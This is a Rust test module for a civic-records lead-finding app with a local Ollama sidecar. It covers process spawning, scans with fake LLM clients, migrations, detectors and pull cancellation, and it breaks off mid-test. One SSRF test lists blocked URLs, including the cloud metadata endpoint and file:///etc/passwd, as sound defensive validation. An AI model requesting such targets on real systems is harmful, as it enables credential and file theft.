    // MUTATION-RESISTANT (per Amendments 001/002). Runs on every platform,
    // including Windows: start_for_test spawns the bundled fixture without a
    // Tauri AppHandle, so no mock_app() is constructed (P5-004 resolved).
    #[test]
    fn test_ollama_sidecar_spawns_a_live_child() {
        // Port 0 cannot have a listener, so the collision probe deterministically
        // sees a free address without racing other parallel tests for an
        // OS-assigned ephemeral port.
        let free_addr = "127.0.0.1:0".to_string();

        let sidecar = crate::core::llm::OllamaSidecar::new();
        assert!(sidecar.child.lock().unwrap().is_none());

        let res = sidecar.start_for_test(&free_addr);
        assert!(res.is_ok());

        {
            let guard = sidecar.child.lock().unwrap();
            assert!(guard.is_some());
            let p = guard.as_ref().unwrap().pid();
            assert!(p > 0);
        }

        let res_stop = sidecar.stop();
        assert!(res_stop.is_ok());
        assert!(sidecar.child.lock().unwrap().is_none());
    }

    // MUTATION-RESISTANT (per Amendments 001/002). Cross-platform: no mock_app().
    #[test]
    fn test_ollama_sidecar_terminates_cleanly_on_drop() {
        let free_addr = "127.0.0.1:0".to_string();

        // test calls sidecar.stop() via drop
        let pid = {
            let sidecar = crate::core::llm::OllamaSidecar::new();
            let res = sidecar.start_for_test(&free_addr);
            assert!(res.is_ok());

            let guard = sidecar.child.lock().unwrap();
            assert!(guard.is_some());
            let p = guard.as_ref().unwrap().pid();
            assert!(p > 0);
            p
        };

        // At this point, the sidecar has been dropped, so the process should
        // have been terminated. Verify drop implicitly calls sidecar.stop().
        let mut sys = sysinfo::System::new_all();
        sys.refresh_all();
        let process_exists = sys.process(sysinfo::Pid::from(pid as usize)).is_some();
        assert!(
            !process_exists,
            "Sidecar process should be terminated after drop"
        );
    }

    // MUTATION-RESISTANT (per Amendments 001/002). Runs on every platform,
    // including Windows: calls the core scan directly with an injected fake
    // client, so no Tauri mock_app() is needed (P5-003 resolved). TEST-006:
    // asserts the scan's leads are actually persisted, not merely that the call
    // returns Ok — an Ok with zero rows would pass a bare is_ok() check while
    // silently dropping every lead.
    #[tokio::test]
    async fn test_daily_scan_persists_model_leads_and_marks_run_completed() {
        let mut conn = rusqlite::Connection::open_in_memory().unwrap();
        crate::core::migrations::run_migrations(&mut conn).unwrap();
        // QA-M2: the scan now short-circuits when there is no evidence in-window,
        // so seed a source + a recent evidence item first; otherwise the scan
        // would return the no-evidence signal and never reach the persist path.
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Test Source".to_string(),
                url: "https://example.gov/feed.xml".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();
        insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: Some("https://example.gov/feed.xml".to_string()),
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "Council discussed the road maintenance budget.".to_string(),
                content_hash: "hash_persist_test".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();
        let db_conn: DbConn = Arc::new(Mutex::new(conn));

        struct FakeLlmClient;
        #[async_trait::async_trait]
        impl crate::core::llm::LlmClient for FakeLlmClient {
            async fn call(
                &self,
                _model: &str,
                _prompt: &str,
                _system: &str,
            ) -> Result<String, String> {
                Ok(r#"{"leads":[{"title":"Council overspend","summary":"Budget anomaly","original_url":"http://example.test/lead"}]}"#.to_string())
            }
        }
        let llm_client: Arc<dyn crate::core::llm::LlmClient> = Arc::new(FakeLlmClient);

        let res = crate::core::daily_scan::run_daily_scan(
            &db_conn,
            &llm_client,
            "aggregator prompt template",
            "Brighton",
            "CO",
            24,
        )
        .await;

        let run_id = res.expect("scan should succeed");

        let conn = db_conn.lock().unwrap();
        let (count, title): (i32, String) = conn
            .query_row(
                "SELECT COUNT(*), COALESCE(MAX(title), '') FROM daily_scan_leads WHERE scan_id = ?1",
                [run_id],
                |row| Ok((row.get(0)?, row.get(1)?)),
            )
            .unwrap();
        assert_eq!(count, 1, "the scan's single lead should be persisted");
        assert_eq!(
            title, "Council overspend",
            "the persisted lead should carry the model's title"
        );

        let status: String = conn
            .query_row(
                "SELECT run_status FROM daily_scan_runs WHERE id = ?1",
                [run_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(
            status, "completed",
            "a successful scan should mark the run completed"
        );
    }

    #[test]
    fn test_migration_0007_survives_existing_evidence_rows() {
        let conn = Connection::open_in_memory().unwrap();
        // Enable foreign keys
        conn.execute("PRAGMA foreign_keys = ON;", []).unwrap();

        // Run migrations up to 0006
        conn.execute_batch(include_str!("../../migrations/0001_init.sql"))
            .unwrap();
        conn.execute_batch(include_str!("../../migrations/0003_settings.sql"))
            .unwrap();
        conn.execute_batch(include_str!("../../migrations/0004_source_tier.sql"))
            .unwrap();
        conn.execute_batch(include_str!("../../migrations/0005_daily_scans.sql"))
            .unwrap();
        conn.execute_batch(include_str!(
            "../../migrations/0006_daily_scan_lead_source_nullable.sql"
        ))
        .unwrap();

        // Insert a source
        conn.execute(
            "INSERT INTO sources (id, name, url, type, tier) VALUES (1, 'Test Source', 'http://example.com', 'rss', 'community_signal')",
            [],
        )
        .unwrap();

        // Insert an evidence item referencing that source
        conn.execute(
            "INSERT INTO evidence_items (id, source_id, fetched_at, excerpt, content_hash, entities) VALUES (1, 1, '2026-05-26T17:39:19Z', 'excerpt', 'hash123', '[]')",
            [],
        )
        .unwrap();

        // Run migration 0007 and make sure it doesn't fail due to foreign key violations/constraints on DROP TABLE
        let migration_res =
            conn.execute_batch(include_str!("../../migrations/0007_source_tier_check.sql"));
        assert!(
            migration_res.is_ok(),
            "Migration 0007 failed under active foreign keys: {:?}",
            migration_res
        );

        // Verify data was preserved
        let source_count: i32 = conn
            .query_row("SELECT COUNT(*) FROM sources", [], |row| row.get(0))
            .unwrap();
        let evidence_count: i32 = conn
            .query_row("SELECT COUNT(*) FROM evidence_items", [], |row| row.get(0))
            .unwrap();
        assert_eq!(source_count, 1);
        assert_eq!(evidence_count, 1);
    }

    // MUTATION-RESISTANT (per Amendments 001/002). Runs on every platform,
    // including Windows: the core scan reads the model from settings itself, so
    // the fake client can assert it without a Tauri mock_app() (P5-003 resolved).
    #[tokio::test]
    async fn test_daily_scan_uses_settings_model_not_hardcoded() {
        let mut conn = Connection::open_in_memory().unwrap();
        crate::core::migrations::run_migrations(&mut conn).unwrap();
        // Insert custom model setting
        conn.execute(
            "INSERT OR REPLACE INTO settings (key, value) VALUES ('model.selected', 'my-custom-model')",
            [],
        )
        .unwrap();
        // QA-M2: seed in-window evidence so the scan does not short-circuit before
        // it resolves and passes the selected model to the LLM client.
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Test Source".to_string(),
                url: "https://example.gov/feed.xml".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();
        insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: Some("https://example.gov/feed.xml".to_string()),
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "Some recent civic evidence.".to_string(),
                content_hash: "hash_model_test".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();
        let db_conn: DbConn = Arc::new(Mutex::new(conn));

        struct FakeLlmClient;
        #[async_trait::async_trait]
        impl crate::core::llm::LlmClient for FakeLlmClient {
            async fn call(
                &self,
                model: &str,
                _prompt: &str,
                _system: &str,
            ) -> Result<String, String> {
                assert_eq!(model, "my-custom-model");
                Ok("{\"leads\":[]}".to_string())
            }
        }
        let llm_client: Arc<dyn crate::core::llm::LlmClient> = Arc::new(FakeLlmClient);

        let res = crate::core::daily_scan::run_daily_scan(
            &db_conn,
            &llm_client,
            "aggregator prompt template",
            "Brighton",
            "CO",
            24,
        )
        .await;

        assert!(res.is_ok());
    }

    // QA-M2: with zero evidence in the window, run_daily_scan must short-circuit
    // BEFORE calling the LLM and return the distinct no-evidence signal — no run
    // row is created, and the (panicking) fake client is never invoked.
    #[tokio::test]
    async fn test_daily_scan_short_circuits_on_zero_evidence() {
        let mut conn = Connection::open_in_memory().unwrap();
        crate::core::migrations::run_migrations(&mut conn).unwrap();
        let db_conn: DbConn = Arc::new(Mutex::new(conn));

        struct PanicLlmClient;
        #[async_trait::async_trait]
        impl crate::core::llm::LlmClient for PanicLlmClient {
            async fn call(&self, _m: &str, _p: &str, _s: &str) -> Result<String, String> {
                panic!("the LLM must NOT be called when there is zero evidence");
            }
        }
        let llm_client: Arc<dyn crate::core::llm::LlmClient> = Arc::new(PanicLlmClient);

        let res = crate::core::daily_scan::run_daily_scan(
            &db_conn,
            &llm_client,
            "aggregator prompt template",
            "Brighton",
            "CO",
            24,
        )
        .await;

        let err = res.expect_err("zero-evidence scan must return an error signal");
        assert_eq!(
            err,
            crate::core::daily_scan::NO_EVIDENCE_SIGNAL,
            "the error must be the recognizable no-evidence signal"
        );

        // No run row should have been created by the short-circuit.
        let conn = db_conn.lock().unwrap();
        let run_count: i32 = conn
            .query_row("SELECT COUNT(*) FROM daily_scan_runs", [], |row| row.get(0))
            .unwrap();
        assert_eq!(
            run_count, 0,
            "no run row should be created on short-circuit"
        );
    }

    // ===== C-6 / CRIT-1: add_source storage gate (SSRF + tier) =====
    //
    // add_source is the single chokepoint every source-ingestion path funnels
    // through (manual / discovery auto-import / bulk import). These tests pin that
    // the SSRF gate and tier allow-list remain WIRED at the command layer: a
    // blocked URL, bad scheme, or bad tier is rejected AND never inserted. If a
    // refactor dropped the validate_source_url call, the "never inserted" assertion
    // would fail even though the validator's own unit tests still pass.

    #[test]
    fn test_add_source_rejects_blocked_urls_and_never_inserts() {
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let db_conn: DbConn = Arc::new(Mutex::new(conn));

        let blocked = [
            ("Metadata", "http://169.254.169.254/latest/meta-data/"),
            ("Local Ollama", "http://127.0.0.1:11434/api/tags"),
            ("RFC1918", "http://10.0.0.5/feed"),
            ("Bad scheme", "file:///etc/passwd"),
            ("FTP scheme", "ftp://example.com/feed"),
        ];
        for (name, url) in blocked {
            let res = crate::tauri_cmds::add_source_inner(
                &db_conn,
                name.to_string(),
                url.to_string(),
                "primary_record".to_string(),
                "official_record".to_string(),
            );
            assert!(res.is_err(), "blocked URL must be rejected: {}", url);
        }

        // A bad tier must also be rejected even with an otherwise-valid URL.
        let bad_tier = crate::tauri_cmds::add_source_inner(
            &db_conn,
            "Bad tier".to_string(),
            "https://example.gov/feed.xml".to_string(),
            "primary_record".to_string(),
            "not_a_real_tier".to_string(),
        );
        assert!(bad_tier.is_err(), "an invalid tier must be rejected");

        // NOTHING from the rejected attempts may have been inserted.
        let conn = db_conn.lock().unwrap();
        let count: i32 = conn
            .query_row("SELECT COUNT(*) FROM sources", [], |row| row.get(0))
            .unwrap();
        assert_eq!(count, 0, "no rejected source may be inserted");
    }

    #[test]
    fn test_add_source_accepts_valid_public_source() {
        // Positive control: a well-formed public https source with a valid tier
        // is accepted and inserted (so the rejection tests above aren't vacuous).
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let db_conn: DbConn = Arc::new(Mutex::new(conn));

        let res = crate::tauri_cmds::add_source_inner(
            &db_conn,
            "Brighton Gov".to_string(),
            "https://www.brightoncolorado.gov/rss".to_string(),
            "primary_record".to_string(),
            "official_record".to_string(),
        );
        assert!(
            res.is_ok(),
            "a valid public source should be accepted: {:?}",
            res.err()
        );

        let conn = db_conn.lock().unwrap();
        let count: i32 = conn
            .query_row("SELECT COUNT(*) FROM sources", [], |row| row.get(0))
            .unwrap();
        assert_eq!(count, 1, "the valid source should be inserted exactly once");
    }

    // ===== TEST-Mn2: detector edge cases =====

    #[test]
    fn test_detector_malformed_profile_json_falls_back_to_defaults() {
        // A malformed profile must NOT panic; parse_profile_config falls back to
        // the default config (threshold 250000, empty watchlist), so a $300k item
        // still fires Money Threshold.
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Src".to_string(),
                url: "https://x.gov/a".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();
        let ev = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: None,
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "Contract awarded for $300,000.".to_string(),
                content_hash: "h_malformed".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();

        // Totally malformed JSON.
        let res = run_detectors(&conn, &[ev], "{ this is not json ]");
        assert!(res.is_ok(), "malformed profile_json must not panic/error");
        let leads = list_leads(&conn).unwrap();
        assert!(
            leads.iter().any(|l| l.detector_name == "Money Threshold"),
            "default threshold should still fire on $300k"
        );
    }

    #[test]
    fn test_detector_threshold_exactly_at_boundary_fires() {
        // The money detector uses `>=`, so an amount EXACTLY at the threshold must
        // fire (boundary correctness).
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Src".to_string(),
                url: "https://x.gov/a".to_string(),
                r#type: "community_signal".to_string(),
                tier: "community_signal".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();
        let ev = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: None,
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "Budget line of exactly $250,000 approved.".to_string(),
                content_hash: "h_boundary".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();
        let profile = r#"{"money_threshold": 250000.0, "watchlist": []}"#;
        run_detectors(&conn, &[ev], profile).unwrap();
        let leads = list_leads(&conn).unwrap();
        assert!(
            leads
                .iter()
                .any(|l| l.detector_name == "Money Threshold" && l.why.contains("250,000")),
            "an amount exactly at the threshold must fire (>= boundary)"
        );
    }

    #[test]
    fn test_detector_empty_watchlist_fires_no_watchlist_hit() {
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Src".to_string(),
                url: "https://x.gov/a".to_string(),
                r#type: "community_signal".to_string(),
                tier: "community_signal".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();
        let ev = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: None,
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "John Doe attended the meeting.".to_string(),
                content_hash: "h_empty_wl".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();
        let profile = r#"{"money_threshold": 250000.0, "watchlist": []}"#;
        run_detectors(&conn, &[ev], profile).unwrap();
        let leads = list_leads(&conn).unwrap();
        assert!(
            !leads.iter().any(|l| l.detector_name == "Watchlist Hit"),
            "an empty watchlist must produce no Watchlist Hit leads"
        );
    }

    #[test]
    fn test_detector_multiple_fire_on_one_item_no_panic() {
        // One evidence item triggering several detectors at once must not panic and
        // must fire each applicable detector exactly as expected.
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Src".to_string(),
                url: "https://x.gov/a".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();
        let ev = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: None,
                fetched_at: Utc::now().to_rfc3339(),
                // Hits: New Primary Record (primary), Money Threshold ($400k),
                // Decision/Vote ("approved"), Watchlist Hit ("Jane Roe").
                excerpt: "The board unanimously approved a $400,000 contract involving Jane Roe."
                    .to_string(),
                content_hash: "h_multi".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();
        let profile = r#"{"money_threshold": 250000.0, "watchlist": ["Jane Roe"]}"#;
        let new_leads = run_detectors(&conn, &[ev], profile).unwrap();
        assert!(
            new_leads.len() >= 4,
            "multiple detectors should fire: {:?}",
            new_leads
        );
        let leads = list_leads(&conn).unwrap();
        for expected in [
            "New Primary Record",
            "Money Threshold",
            "Decision / Vote",
            "Watchlist Hit",
        ] {
            assert!(
                leads.iter().any(|l| l.detector_name == expected),
                "expected detector '{}' to fire",
                expected
            );
        }
    }

    // ===== TEST-Mn3: list_evidence_since window boundary =====

    #[test]
    fn test_list_evidence_since_window_boundary() {
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Src".to_string(),
                url: "https://x.gov/a".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();

        let now = Utc::now();
        let insert_at = |conn: &Connection, when: chrono::DateTime<Utc>, hash: &str| {
            insert_evidence_item(
                conn,
                &EvidenceItem {
                    id: None,
                    source_id,
                    url: None,
                    fetched_at: when.to_rfc3339(),
                    excerpt: format!("evidence {}", hash),
                    content_hash: hash.to_string(),
                    entities: "[]".to_string(),
                },
            )
            .unwrap();
        };

        // 24h window: one item 1h ago (inside), one 25h ago (outside).
        insert_at(&conn, now - chrono::Duration::hours(1), "inside_24");
        insert_at(&conn, now - chrono::Duration::hours(25), "outside_24");
        let within_24 = list_evidence_since(&conn, 24).unwrap();
        assert!(
            within_24.iter().any(|e| e.content_hash == "inside_24"),
            "an item 1h old must be inside the 24h window"
        );
        assert!(
            !within_24.iter().any(|e| e.content_hash == "outside_24"),
            "an item 25h old must be outside the 24h window"
        );

        // 168h (7d) window: one item 167h ago (inside), one 169h ago (outside).
        insert_at(&conn, now - chrono::Duration::hours(167), "inside_168");
        insert_at(&conn, now - chrono::Duration::hours(169), "outside_168");
        let within_168 = list_evidence_since(&conn, 168).unwrap();
        assert!(
            within_168.iter().any(|e| e.content_hash == "inside_168"),
            "an item 167h old must be inside the 168h window"
        );
        assert!(
            !within_168.iter().any(|e| e.content_hash == "outside_168"),
            "an item 169h old must be outside the 168h window"
        );
    }

    // ===== TEST-M1: feed entry -> excerpt mapping on a real feed fixture =====

    #[test]
    fn test_feed_media_lead_excerpt_is_headline_only() {
        // Parse a real RSS feed via feed_rs and assert that the per-entry excerpt
        // built for a media_lead source carries the HEADLINE ONLY (never the body),
        // while a primary_record source keeps the description. This exercises the
        // same build_excerpt path scrape_source uses, against parsed feed entries.
        let rss = r#"<?xml version="1.0"?>
        <rss version="2.0"><channel>
          <title>Test Feed</title>
          <item>
            <title>Mayor announces new park</title>
            <description>SECRET BODY TEXT that must never be stored for media leads.</description>
            <link>https://news.example.com/park</link>
          </item>
        </channel></rss>"#;
        let feed = feed_rs::parser::parse(rss.as_bytes()).unwrap();
        let entry = &feed.entries[0];
        let title = entry
            .title
            .as_ref()
            .map(|t| t.content.clone())
            .unwrap_or_default();
        let description = entry
            .summary
            .as_ref()
            .map(|s| s.content.clone())
            .unwrap_or_default();

        let media = crate::core::scraper::build_excerpt("media_lead", &title, &description);
        assert_eq!(media, "Headline: Mayor announces new park");
        assert!(
            !media.contains("SECRET BODY TEXT"),
            "media_lead must never store body text: {}",
            media
        );

        let record = crate::core::scraper::build_excerpt("primary_record", &title, &description);
        assert!(
            record.contains("SECRET BODY TEXT"),
            "primary_record must retain the description body"
        );
    }

    struct NoopPullSink;
    impl crate::core::llm::PullProgressSink for NoopPullSink {
        fn progress(&self, _payload: crate::core::llm::PullProgress) {}
        fn complete(&self) {}
        fn error(&self, _message: String) {}
    }

    // Polls `cond` until it holds or `timeout` elapses, returning the final
    // result. Replaces fixed `sleep`s when waiting for an async side effect
    // (e.g. a cancellation propagating through CANCEL_PULL_MAP): a fixed sleep
    // either flakes under load if too short or wastes wall-clock if too long.
    async fn poll_until<F: Fn() -> bool>(timeout: std::time::Duration, cond: F) -> bool {
        let start = tokio::time::Instant::now();
        while start.elapsed() < timeout {
            if cond() {
                return true;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        cond()
    }

    // MUTATION-RESISTANT (per Amendments 001/002). Runs on every platform,
    // including Windows: drives the core pull against a local stub server on an
    // OS-assigned ephemeral port with a no-op sink, so no Tauri mock_app() is
    // needed and parallel tests never collide on a fixed port (P5-003 resolved).
    #[tokio::test]
    async fn test_pull_ollama_model_propagates_http_error() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base_url = format!("http://{}", listener.local_addr().unwrap());

        let app = axum::Router::new().route(
            "/api/pull",
            axum::routing::post(|| async { (axum::http::StatusCode::NOT_FOUND, "Not Found") }),
        );

        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let res = crate::core::llm::run_ollama_pull(
            "non-existent-model-xyz".to_string(),
            &base_url,
            std::sync::Arc::new(NoopPullSink),
        )
        .await;
        assert!(res.is_err());
        assert!(res.unwrap_err().contains("status 404"));
    }

    // MUTATION-RESISTANT (per Amendments 001/002). Runs on every platform,
    // including Windows: exercises the real per-model cancellation map without a
    // Tauri mock_app(); the stub server uses an ephemeral port (P5-003 resolved).
    // Cancelling one model's pull must not disturb another model's in-flight pull.
    #[tokio::test]
    async fn test_cancel_ollama_pull_is_per_model() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base_url = format!("http://{}", listener.local_addr().unwrap());

        let app = axum::Router::new().route(
            "/api/pull",
            axum::routing::post(|| async {
                let stream = futures_util::stream::unfold(0, |state| async move {
                    if state < 5 {
                        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                        Some((
                            Ok::<_, axum::Error>(bytes::Bytes::from(
                                "{\"status\":\"downloading\"}\n",
                            )),
                            state + 1,
                        ))
                    } else {
                        tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
                        None
                    }
                });
                axum::response::Response::new(axum::body::Body::from_stream(stream))
            }),
        );

        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let res1 = crate::core::llm::run_ollama_pull(
            "model-1".to_string(),
            &base_url,
            std::sync::Arc::new(NoopPullSink),
        )
        .await;
        assert!(res1.is_ok());

        let res2 = crate::core::llm::run_ollama_pull(
            "model-2".to_string(),
            &base_url,
            std::sync::Arc::new(NoopPullSink),
        )
        .await;
        assert!(res2.is_ok());

        {
            let map = crate::core::llm::CANCEL_PULL_MAP.lock().unwrap();
            assert!(map.contains_key("model-1"));
            assert!(map.contains_key("model-2"));
        }

        crate::core::llm::cancel_pull("model-1");

        // Wait (bounded) for the cancellation to drain model-1 from the map.
        let model_1_removed = poll_until(std::time::Duration::from_secs(5), || {
            let map = crate::core::llm::CANCEL_PULL_MAP.lock().unwrap();
            !map.contains_key("model-1")
        })
        .await;
        assert!(
            model_1_removed,
            "cancelling model-1 should remove its entry from CANCEL_PULL_MAP"
        );

        {
            let map = crate::core::llm::CANCEL_PULL_MAP.lock().unwrap();
            assert!(
                map.contains_key("model-2"),
                "cancelling model-1 must not disturb model-2's in-flight pull"
            );
        }

        crate::core::llm::cancel_pull("model-2");
    }

    // ENG-001: a second pull for a model that already has one in flight must be
    // rejected, not silently overwrite the first's cancel sender (which would
    // orphan the first pull and let the first's completion remove the second's
    // entry). Verifies the duplicate is refused and the original entry survives.
    #[tokio::test]
    async fn test_duplicate_same_model_pull_is_rejected() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base_url = format!("http://{}", listener.local_addr().unwrap());

        let app = axum::Router::new().route(
            "/api/pull",
            axum::routing::post(|| async {
                // Keep the connection open so the pull stays in flight.
                let stream = futures_util::stream::unfold(0, |state| async move {
                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                    Some((
                        Ok::<_, axum::Error>(bytes::Bytes::from("{\"status\":\"downloading\"}\n")),
                        state + 1,
                    ))
                });
                axum::response::Response::new(axum::body::Body::from_stream(stream))
            }),
        );

        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let res1 = crate::core::llm::run_ollama_pull(
            "dup-model".to_string(),
            &base_url,
            std::sync::Arc::new(NoopPullSink),
        )
        .await;
        assert!(res1.is_ok(), "the first pull should start");

        let res2 = crate::core::llm::run_ollama_pull(
            "dup-model".to_string(),
            &base_url,
            std::sync::Arc::new(NoopPullSink),
        )
        .await;
        assert!(
            res2.is_err(),
            "a duplicate same-model pull must be rejected, not started"
        );
        assert!(
            res2.unwrap_err().contains("already in progress"),
            "the rejection should explain a pull is already in progress"
        );

        // The original pull's entry must still be present (not clobbered).
        {
            let map = crate::core::llm::CANCEL_PULL_MAP.lock().unwrap();
            assert!(
                map.contains_key("dup-model"),
                "the original in-flight pull's cancel sender must survive the rejected duplicate"
            );
        }

        crate::core::llm::cancel_pull("dup-model");
        let removed = poll_until(std::time::Duration::from_secs(5), || {
            let map = crate::core::llm::CANCEL_PULL_MAP.lock().unwrap();
            !map.contains_key("dup-model")
        })
        .await;
        assert!(
            removed,
            "cancelling the original pull should drain its entry"
        );
    }

    // ENG-006: a base_url carrying a trailing slash must not produce a
    // double-slashed "//api/pull" (which the stub server — like real Ollama —
    // would not route, surfacing as an error). The stub only registers
    // "/api/pull", so an Ok here proves the trailing slash was trimmed.
    #[tokio::test]
    async fn test_run_ollama_pull_trims_trailing_slash_in_base_url() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let app = axum::Router::new().route(
            "/api/pull",
            axum::routing::post(|| async {
                (axum::http::StatusCode::OK, "{\"status\":\"success\"}\n")
            }),
        );

        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        // Note the trailing slash on the base URL.
        let base_url = format!("http://{}/", addr);
        let res = crate::core::llm::run_ollama_pull(
            "slash-model".to_string(),
            &base_url,
            std::sync::Arc::new(NoopPullSink),
        )
        .await;
        assert!(
            res.is_ok(),
            "a trailing-slash base_url should still reach /api/pull, got {:?}",
            res
        );

        // The short body completes the stream, draining the entry on its own.
        let drained = poll_until(std::time::Duration::from_secs(5), || {
            let map = crate::core::llm::CANCEL_PULL_MAP.lock().unwrap();
            !map.contains_key("slash-model")
        })
        .await;
        assert!(
            drained,
            "the completed pull should remove its own map entry"
        );
    }

    // B-1 remediation: the collision-detection that drives start()'s skip path
    // is extracted into port_in_use(), so the cross-platform coexistence
    // guarantee is verified on every platform (including Windows) without
    // constructing a Tauri AppHandle. mock_app() is incompatible with Windows
    // console-mode lib unit tests, which is why the prior test was ignored there
    // and the cross-platform claim was unproven on Windows.
    #[tokio::test]
    async fn test_port_in_use_detects_listener_cross_platform() {
        // Bind an OS-assigned ephemeral port so this test is isolated from
        // whatever may be running on the real Ollama port (11434).
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap().to_string();

        assert!(
            crate::core::llm::OllamaSidecar::port_in_use(&addr),
            "a bound listener at {addr} must be detected as in use; this is the \
             collision check start() relies on to skip spawning the sidecar"
        );

        drop(listener);

        assert!(
            !crate::core::llm::OllamaSidecar::port_in_use(&addr),
            "once the listener is dropped, {addr} must no longer be reported in use"
        );
    }

    // The full start() skip path — returns Ok and spawns no child when the
    // probed port is already in use — verified cross-platform via start_for_test,
    // which injects the probe address so we neither bind the real 11434 (a
    // developer's actual ollama may hold it) nor construct an AppHandle.
    #[test]
    fn test_sidecar_skips_spawn_when_port_occupied() {
        // Hold an OS-assigned port for the duration of the test so the probe
        // sees it as occupied.
        let _occupied = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = _occupied.local_addr().unwrap().to_string();

        let sidecar = crate::core::llm::OllamaSidecar::new();
        let res = sidecar.start_for_test(&addr);
        assert!(res.is_ok());

        // No child should have been spawned because the port was in use.
        let child_guard = sidecar.child.lock().unwrap();
        assert!(child_guard.is_none());
    }

    // TEST-002: the spawn side of start()'s control flow — when the probed port
    // is free, start_internal acquires the guard and spawns a child. Exercised
    // via start_for_test (a faithful mirror of start() post-ENG-004) so the loop
    // wiring, not just the port-check predicate, is covered without a Tauri
    // AppHandle. The bundled fixture runs until killed; OllamaSidecar's Drop (and
    // the explicit stop() here) reaps it so no process leaks.
    #[test]
    fn test_sidecar_spawns_when_port_free() {
        // Port 0 cannot have a listener, so this avoids a race where another
        // parallel test grabs a just-released ephemeral port before the probe.
        let addr = "127.0.0.1:0".to_string();

        let sidecar = crate::core::llm::OllamaSidecar::new();
        let res = sidecar.start_for_test(&addr);
        assert!(res.is_ok(), "spawn path should succeed, got {:?}", res);

        {
            let child_guard = sidecar.child.lock().unwrap();
            assert!(
                child_guard.is_some(),
                "a child must be spawned when the probed port is free"
            );
        }

        // Reap the spawned fixture deterministically.
        let _ = sidecar.stop();
        let child_guard = sidecar.child.lock().unwrap();
        assert!(child_guard.is_none(), "stop() must clear the spawned child");
    }

    // ENG-004: start() must never kill a process it did not spawn. The orphan
    // sweep that previously enumerated processes and force-killed anything
    // matching `ollama ... serve` has been removed; coexistence is delivered
    // solely by the port-collision early-return. This test pins that policy by
    // asserting an already-listening port causes start_for_test to return Ok
    // while spawning nothing (no enumeration, no kill).
    #[test]
    fn test_sidecar_does_not_kill_external_listener() {
        let _occupied = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = _occupied.local_addr().unwrap().to_string();

        let sidecar = crate::core::llm::OllamaSidecar::new();
        let res = sidecar.start_for_test(&addr);
        assert!(res.is_ok());

